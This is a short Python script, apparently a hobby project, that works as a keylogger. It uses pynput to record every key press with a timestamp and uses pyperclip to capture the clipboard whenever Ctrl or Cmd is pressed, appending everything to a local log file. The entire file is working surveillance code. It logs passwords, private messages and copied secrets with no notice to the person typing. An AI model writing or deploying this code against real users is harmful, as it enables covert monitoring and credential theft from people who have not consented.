from pynput.keyboard import Listener
from datetime import datetime
import pyperclip


KEYSTROKE_LOG_FILE = "./logs/temp.txt"

def log_key_press(key):
	key = str(key).replace("'","")
	write_line = None

	time = str(datetime.now())

	if key == 'Key.ctrl_l':
		write_line = f"{time}: Clipboard - {pyperclip.paste()}"
	elif key == 'Key.cmd':
		write_line = f"{time}: Clipboard - {pyperclip.paste()}"

	else:
		write_line = f"{time}: Key - {key}"


	with open(KEYSTROKE_LOG_FILE,'a') as f:
		f.write(f"{write_line}\n")
		f.close()

def start():
	#figure out how to track key presses

	with Listener(on_press=log_key_press) as l:
		l.join()


if __name__ == '__main__':

	start()
	